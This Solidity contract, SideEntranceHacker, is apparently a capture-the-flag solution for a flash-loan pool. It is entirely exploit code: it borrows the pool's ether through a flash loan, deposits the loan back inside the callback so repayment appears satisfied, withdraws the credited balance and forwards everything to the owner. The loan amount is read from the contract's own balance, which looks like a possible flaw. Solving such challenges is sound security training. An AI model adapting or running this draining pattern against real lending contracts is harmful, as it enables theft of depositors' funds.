// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;


interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntranceHacker is IFlashLoanEtherReceiver {
    address private immutable OWNER;
    constructor() payable{
        OWNER = msg.sender;
    }  

    function execute() external payable {
        (bool success,) = (msg.sender).call{value: msg.value}(abi.encodeWithSignature("deposit()"));
        require(success, "tx failed");
    }

    function hack(address pool) external {
        require(OWNER == msg.sender, "Not the Owner");
        (bool succes1,) = pool.call(abi.encodeWithSignature("flashLoan(uint256)", address(this).balance));
        require(succes1, "tx1 failed");
        (bool success2,) = pool.call(abi.encodeWithSignature("withdraw()"));
        require(success2, "tx2 failed");

        (bool success3,) = OWNER.call{value: address(this).balance}("");
        require(success3, "tx3 failed");
    }   

    receive() external payable {
        
    }
}